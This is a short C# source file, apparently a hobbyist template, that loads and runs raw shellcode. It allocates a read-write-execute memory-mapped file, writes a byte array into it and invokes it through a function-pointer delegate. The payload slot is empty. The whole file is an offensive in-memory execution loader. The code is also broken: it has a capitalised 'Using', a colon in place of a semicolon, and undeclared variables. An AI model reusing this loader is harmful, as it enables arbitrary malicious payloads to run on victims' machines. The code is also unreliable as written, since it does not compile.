// Babies first shellcode wrapper
// Not that stable

namespace DoTheVoodoo
{
  using System;
  using System.IO.MemoryMappedFiles;
  Using System.Runtime.InteropServices;
  
  class Program
  {
    // Function Delegate to Invoke Shellcode
    private delegate IntPtr GetPebDelegate();
    
    //Shellcode Function Used To Obtain PEB of the Process
    private unsafe static IntPtr GetPeb()
    {
      var shellcode = new byte[]
      {
      // Drop the Shellcode in here!
      };

      try
      {
        //Create a RWX memory mapped file to hold our shellcode
        mmf = MemoryMappedFile.CreateNew("__Shellcode", shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

        // Created a memory mapped view accessor with RWX perms
        mmva = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute);

        // Write the shellcode to the MMF
        mmva.WriteArray(0, shellcode, 0, shellcode.Length);

        // Obtain a Pointer to our MMF
        mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);

        // Create a function delegate to the shellcode in our MMF
        var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(GetPebDelegate));

        // Invoke the shellcode
        return func():
      }
      catch
      {
      // I guess we do error handling on this repo now
      return IntPtr.Zero;
      }
    }
    // Entry Point
    static void Main(string[] args)
    {
      var peb = GetPeb();
      Console.WriteLine("We in this");
    }
  }
}
